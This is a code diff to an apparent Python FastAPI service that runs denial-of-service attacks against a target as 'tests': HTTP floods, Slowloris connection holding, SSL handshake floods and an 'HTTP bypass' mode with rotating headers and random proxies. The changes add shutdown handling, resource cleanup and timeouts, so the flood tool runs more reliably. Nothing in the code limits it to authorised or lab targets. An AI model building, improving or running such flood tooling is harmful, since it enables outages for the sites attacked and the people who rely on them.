@@ -13,8 +13,12 @@ import socket
 from datetime import datetime
 from enum import Enum
 import threading
-from urllib.parse import urlparse
+import signal
 import concurrent.futures
+from urllib.parse import urlparse
+import sys
+import atexit
+import weakref
 
 # Configure logging
 logging.basicConfig(
@@ -34,6 +38,13 @@ app = FastAPI(
 active_tests = {}
 test_results = {}
 test_stop_events = {}
+
+# Global variables for resource tracking
+active_executors = weakref.WeakSet()
+active_sockets = weakref.WeakSet()
+active_sessions = weakref.WeakSet()
+shutdown_in_progress = False
+cleanup_lock = threading.Lock()
 
 # Default User-Agents
 DEFAULT_USER_AGENTS = [
@@ -129,9 +140,104 @@ class TestMetrics:
             "successful_requests": self.successful_requests.value(),
             "failed_requests": self.failed_requests.value(),
             "duration": (self.end_time or time.time()) - self.start_time,
-            "requests_per_second": self.requests_sent.value() / ((self.end_time or time.time()) - self.start_time),
+            "requests_per_second": self.requests_sent.value() / max(0.1,
+                                                                    (self.end_time or time.time()) - self.start_time),
             "success_rate": (self.successful_requests.value() / max(1, self.requests_sent.value())) * 100
         }
+
+
+# Resource management functions
+def register_socket(sock):
+    """Register a socket for tracking and cleanup"""
+    if not shutdown_in_progress:
+        active_sockets.add(sock)
+    return sock
+
+
+def register_session(session):
+    """Register an HTTP session for tracking and cleanup"""
+    if not shutdown_in_progress:
+        active_sessions.add(session)
+    return session
+
+
+def register_executor(executor):
+    """Register a thread pool executor for tracking and cleanup"""
+    if not shutdown_in_progress:
+        active_executors.add(executor)
+    return executor
+
+
+def cleanup_resources():
+    """Clean up all tracked resources"""
+    global shutdown_in_progress
+
+    with cleanup_lock:
+        if shutdown_in_progress:
+            return
+        shutdown_in_progress = True
+
+        logger.info("Starting resource cleanup...")
+
+        # Stop all tests
+        for test_id, stop_event in list(test_stop_events.items()):
+            logger.info(f"Setting stop event for test {test_id}")
+            stop_event.set()
+
+        # Close all sessions
+        logger.info(f"Closing {len(active_sessions)} active sessions")
+        for session in list(active_sessions):
+            try:
+                session.close()
+            except Exception as e:
+                pass
+
+        # Close all sockets
+        logger.info(f"Closing {len(active_sockets)} active sockets")
+        for sock in list(active_sockets):
+            try:
+                sock.close()
+            except Exception as e:
+                pass
+
+        # Shutdown all executors
+        logger.info(f"Shutting down {len(active_executors)} active executors")
+        for executor in list(active_executors):
+            try:
+                executor.shutdown(wait=False)
+            except Exception as e:
+                pass
+
+        logger.info("Resource cleanup completed")
+
+
+# Register cleanup handlers
+atexit.register(cleanup_resources)
+
+
+# Signal handlers
+def signal_handler(signum, frame):
+    """Handle termination signals"""
+    logger.info(f"Received signal {signum}, initiating shutdown")
+    cleanup_resources()
+    # Give a short time for cleanup to take effect before the process gets terminated
+    time.sleep(1)
+    sys.exit(0)
+
+
+# Register signal handlers
+signal.signal(signal.SIGTERM, signal_handler)
+signal.signal(signal.SIGINT, signal_handler)
+
+
+# FastAPI lifecycle events
+@app.on_event("shutdown")
+async def on_shutdown():
+    """Handle FastAPI shutdown event"""
+    logger.info("FastAPI shutdown event triggered")
+    cleanup_resources()
+    # Give a short time for cleanup to take effect
+    await asyncio.sleep(1)
 
 
 # Test execution methods
@@ -160,10 +266,10 @@ async def execute_http_flood(test_id, params, stop_event, metrics):
     end_time = start_time + duration
 
     # Create workers
-    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
+    with register_executor(concurrent.futures.ThreadPoolExecutor(max_workers=threads)) as executor:
         futures = []
         for i in range(threads):
-            if stop_event.is_set():
+            if stop_event.is_set() or shutdown_in_progress:
                 break
 
             proxy = random.choice(proxies) if proxies else None
@@ -174,12 +280,17 @@ async def execute_http_flood(test_id, params, stop_event, metrics):
                 )
             )
 
-        # Wait for all workers to complete
-        for future in concurrent.futures.as_completed(futures):
-            try:
-                future.result()
-            except Exception as e:
-                logger.error(f"Error in worker: {e}")
+        # Wait for all workers to complete or until stop_event is set
+        try:
+            for future in concurrent.futures.as_completed(futures, timeout=duration + 10):
+                try:
+                    future.result()
+                except Exception as e:
+                    logger.error(f"Error in worker: {e}")
+        except concurrent.futures.TimeoutError:
+            logger.warning(f"Some workers did not complete in time for test {test_id}")
+        except Exception as e:
+            logger.error(f"Error waiting for workers: {e}")
 
     # Update end time
     test_metrics.end_time = time.time()
@@ -209,18 +320,18 @@ def http_flood_worker(target, host, is_ssl, rpc, end_time, metrics, stop_event, 
     }
 
     # Setup session with proxy if provided
-    session = httpx.Client(
+    session = register_session(httpx.Client(
         proxies=proxy.as_url() if proxy else None,
         verify=False,  # Skip SSL verification for performance
         timeout=15.0  # Reasonable timeout
-    )
+    ))
 
     try:
-        while time.time() < end_time and not stop_event.is_set():
+        while time.time() < end_time and not stop_event.is_set() and not shutdown_in_progress:
             try:
                 # Send requests
                 for _ in range(rpc):
-                    if time.time() >= end_time or stop_event.is_set():
+                    if time.time() >= end_time or stop_event.is_set() or shutdown_in_progress:
                         break
 
                     # Add some randomness to the headers
@@ -241,7 +352,8 @@ def http_flood_worker(target, host, is_ssl, rpc, end_time, metrics, stop_event, 
 
             except Exception as e:
                 metrics.failed_requests.increment()
-                time.sleep(0.1)  # Small delay on error
+                if not (stop_event.is_set() or shutdown_in_progress):
+                    time.sleep(0.1)  # Small delay on error
 
     finally:
         session.close()
@@ -271,10 +383,10 @@ async def execute_slow_loris(test_id, params, stop_event, metrics):
     end_time = start_time + duration
 
     # Create workers
-    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
+    with register_executor(concurrent.futures.ThreadPoolExecutor(max_workers=threads)) as executor:
         futures = []
         for i in range(threads):
-            if stop_event.is_set():
+            if stop_event.is_set() or shutdown_in_progress:
                 break
 
             proxy = random.choice(proxies) if proxies else None
@@ -285,12 +397,17 @@ async def execute_slow_loris(test_id, params, stop_event, metrics):
                 )
             )
 
-        # Wait for all workers to complete
-        for future in concurrent.futures.as_completed(futures):
-            try:
-                future.result()
-            except Exception as e:
-                logger.error(f"Error in worker: {e}")
+        # Wait for all workers to complete or until stop_event is set
+        try:
+            for future in concurrent.futures.as_completed(futures, timeout=duration + 10):
+                try:
+                    future.result()
+                except Exception as e:
+                    logger.error(f"Error in worker: {e}")
+        except concurrent.futures.TimeoutError:
+            logger.warning(f"Some workers did not complete in time for test {test_id}")
+        except Exception as e:
+            logger.error(f"Error waiting for workers: {e}")
 
     # Update end time
     test_metrics.end_time = time.time()
@@ -313,10 +430,10 @@ def slow_loris_worker(host, port, path, is_ssl, end_time, metrics, stop_event, p
     max_sockets = 150  # Maximum connections per worker
 
     try:
-        while time.time() < end_time and not stop_event.is_set() and socket_count < max_sockets:
+        while time.time() < end_time and not stop_event.is_set() and not shutdown_in_progress and socket_count < max_sockets:
             try:
                 # Create socket
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s = register_socket(socket.socket(socket.AF_INET, socket.SOCK_STREAM))
                 s.settimeout(5)
 
                 # Connect to target
@@ -332,7 +449,7 @@ def slow_loris_worker(host, port, path, is_ssl, end_time, metrics, stop_event, p
                     context = ssl.create_default_context()
                     context.check_hostname = False
                     context.verify_mode = ssl.CERT_NONE
-                    s = context.wrap_socket(s, server_hostname=host)
+                    s = register_socket(context.wrap_socket(s, server_hostname=host))
 
                 # Send partial HTTP request
                 s.send(f"GET {path} HTTP/1.1\r\n".encode())
@@ -351,10 +468,11 @@ def slow_loris_worker(host, port, path, is_ssl, end_time, metrics, stop_event, p
 
             except Exception as e:
                 metrics.failed_requests.increment()
-                time.sleep(0.5)  # Longer delay on error
+                if not (stop_event.is_set() or shutdown_in_progress):
+                    time.sleep(0.5)  # Longer delay on error
 
         # Keep connections alive by sending headers periodically
-        while time.time() < end_time and not stop_event.is_set():
+        while time.time() < end_time and not stop_event.is_set() and not shutdown_in_progress:
             for i, s in enumerate(list(sockets)):
                 try:
                     # Send a partial header to keep connection alive
@@ -363,11 +481,13 @@ def slow_loris_worker(host, port, path, is_ssl, end_time, metrics, stop_event, p
                 except:
                     # Socket error, remove from list
                     sockets.remove(s)
-                    s.close()
-                    metrics.failed_requests.increment()
+                    try:
+                        s.close()
+                    except:
+                        pass
 
             # Send incomplete headers every few seconds
-            time.sleep(15)
+            time.sleep(5)  # Shorter sleep time for more responsive shutdown
 
     finally:
         # Clean up any remaining sockets
@@ -405,10 +525,10 @@ async def execute_ssl_flood(test_id, params, stop_event, metrics):
     end_time = start_time + duration
 
     # Create workers
-    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
+    with register_executor(concurrent.futures.ThreadPoolExecutor(max_workers=threads)) as executor:
         futures = []
         for i in range(threads):
-            if stop_event.is_set():
+            if stop_event.is_set() or shutdown_in_progress:
                 break
 
             proxy = random.choice(proxies) if proxies else None
@@ -419,12 +539,17 @@ async def execute_ssl_flood(test_id, params, stop_event, metrics):
                 )
             )
 
-        # Wait for all workers to complete
-        for future in concurrent.futures.as_completed(futures):
-            try:
-                future.result()
-            except Exception as e:
-                logger.error(f"Error in worker: {e}")
+        # Wait for all workers to complete or until stop_event is set
+        try:
+            for future in concurrent.futures.as_completed(futures, timeout=duration + 10):
+                try:
+                    future.result()
+                except Exception as e:
+                    logger.error(f"Error in worker: {e}")
+        except concurrent.futures.TimeoutError:
+            logger.warning(f"Some workers did not complete in time for test {test_id}")
+        except Exception as e:
+            logger.error(f"Error waiting for workers: {e}")
 
     # Update end time
     test_metrics.end_time = time.time()
@@ -442,11 +567,11 @@ def ssl_flood_worker(host, port, end_time, metrics, stop_event, proxy=None):
     """
     Worker function for SSL flood
     """
-    while time.time() < end_time and not stop_event.is_set():
+    while time.time() < end_time and not stop_event.is_set() and not shutdown_in_progress:
         s = None
         try:
             # Create socket
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s = register_socket(socket.socket(socket.AF_INET, socket.SOCK_STREAM))
             s.settimeout(5)
 
             # Connect to target
@@ -463,7 +588,7 @@ def ssl_flood_worker(host, port, end_time, metrics, stop_event, proxy=None):
             context.verify_mode = ssl.CERT_NONE
 
             # Perform SSL handshake
-            s = context.wrap_socket(s, server_hostname=host)
+            s = register_socket(context.wrap_socket(s, server_hostname=host))
 
             # Update metrics
             metrics.requests_sent.increment()
@@ -479,7 +604,10 @@ def ssl_flood_worker(host, port, end_time, metrics, stop_event, proxy=None):
                     s.close()
                 except:
                     pass
-            time.sleep(0.1)  # Small delay between connections
+
+            # Small delay between connections, check stop condition
+            if not (stop_event.is_set() or shutdown_in_progress):
+                time.sleep(0.1)
 
 
 async def execute_http_bypass(test_id, params, stop_event, metrics):
@@ -543,10 +671,10 @@ async def execute_http_bypass(test_id, params, stop_event, metrics):
     ]
 
     # Create workers
-    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
+    with register_executor(concurrent.futures.ThreadPoolExecutor(max_workers=threads)) as executor:
         futures = []
         for i in range(threads):
-            if stop_event.is_set():
+            if stop_event.is_set() or shutdown_in_progress:
                 break
 
             proxy = random.choice(proxies) if proxies else None
@@ -557,12 +685,17 @@ async def execute_http_bypass(test_id, params, stop_event, metrics):
                 )
             )
 
-        # Wait for all workers to complete
-        for future in concurrent.futures.as_completed(futures):
-            try:
-                future.result()
-            except Exception as e:
-                logger.error(f"Error in worker: {e}")
+        # Wait for all workers to complete or until stop_event is set
+        try:
+            for future in concurrent.futures.as_completed(futures, timeout=duration + 10):
+                try:
+                    future.result()
+                except Exception as e:
+                    logger.error(f"Error in worker: {e}")
+        except concurrent.futures.TimeoutError:
+            logger.warning(f"Some workers did not complete in time for test {test_id}")
+        except Exception as e:
+            logger.error(f"Error waiting for workers: {e}")
 
     # Update end time
     test_metrics.end_time = time.time()
@@ -580,14 +713,14 @@ def http_bypass_worker(target, header_sets, end_time, metrics, stop_event, proxy
     """
     Worker function for HTTP bypass
     """
-    session = httpx.Client(
+    session = register_session(httpx.Client(
         proxies=proxy.as_url() if proxy else None,
         verify=False,
         timeout=15.0
-    )
+    ))
 
     try:
-        while time.time() < end_time and not stop_event.is_set():
+        while time.time() < end_time and not stop_event.is_set() and not shutdown_in_progress:
             # Pick a random header set
             headers = random.choice(header_sets).copy()
 
@@ -613,12 +746,16 @@ def http_bypass_worker(target, header_sets, end_time, metrics, stop_event, proxy
                 else:
                     metrics.failed_requests.increment()
 
-                # Small delay between requests
+                # Small delay between requests, check stop condition
+                if stop_event.is_set() or shutdown_in_progress:
+                    break
+
                 time.sleep(0.1)
 
             except Exception as e:
                 metrics.failed_requests.increment()
-                time.sleep(0.5)  # Longer delay on error
+                if not (stop_event.is_set() or shutdown_in_progress):
+                    time.sleep(0.5)  # Longer delay on error
 
     finally:
         session.close()
@@ -639,6 +776,13 @@ async def execute_test(test_params: TestParameters, background_tasks: Background
     """
     Execute a test with the specified parameters
     """
+    # Block new tests during shutdown
+    if shutdown_in_progress:
+        raise HTTPException(
+            status_code=503,
+            detail="Service is shutting down, not accepting new tests"
+        )
+
     # Generate test ID
     test_id = str(uuid.uuid4())
 
@@ -687,15 +831,21 @@ async def run_test(test_id, params, stop_event, metrics):
         # Execute test
         result = await test_method(test_id, params, stop_event, metrics)
 
-        # Store results
+        # Store results and update status
         test_results[test_id] = result
-        active_tests[test_id]["status"] = "completed"
-        active_tests[test_id]["end_time"] = time.time()
+
+        # Only update if test isn't already stopped
+        if test_id in active_tests:
+            if active_tests[test_id]["status"] != "stopped":
+                active_tests[test_id]["status"] = "completed"
+            active_tests[test_id]["end_time"] = time.time()
 
     except Exception as e:
         logger.error(f"Error executing test {test_id}: {e}")
-        active_tests[test_id]["status"] = "failed"
-        active_tests[test_id]["error"] = str(e)
+        if test_id in active_tests:
+            active_tests[test_id]["status"] = "failed"
+            active_tests[test_id]["error"] = str(e)
+            active_tests[test_id]["end_time"] = time.time()
         test_results[test_id] = {"error": str(e)}
 
     finally:
@@ -736,7 +886,7 @@ async def get_test_status(test_id: str):
 
     test = active_tests[test_id]
 
-    # Buat respons yang lebih lengkap
+    # Build response with complete information
     response = {
         "test_id": test_id,
         "status": test["status"],
@@ -747,7 +897,7 @@ async def get_test_status(test_id: str):
         response["end_time"] = test["end_time"]
         response["duration"] = test["end_time"] - test["start_time"]
 
-    # Tambahkan metrik real-time jika tes sedang berjalan
+    # Add real-time metrics if test is running
     if test["status"] == "running" and hasattr(test, "metrics"):
         metrics = test.get("metrics")
         if metrics:
@@ -758,7 +908,7 @@ async def get_test_status(test_id: str):
                 "current_duration": time.time() - test["start_time"]
             }
 
-    # Tambahkan hasil lengkap jika tes sudah selesai
+    # Add complete results if test has finished
     if test["status"] in ["completed", "failed", "stopped"]:
         if test_id in test_results:
             response["results"] = test_results[test_id]
@@ -773,7 +923,9 @@ async def health_check():
     """
     Health check endpoint
     """
-    return {"status": "healthy"}
+    if shutdown_in_progress:
+        return {"status": "shutting_down", "active_tests": len(active_tests)}
+    return {"status": "healthy", "active_tests": len(active_tests)}
 
 
 if __name__ == "__main__":
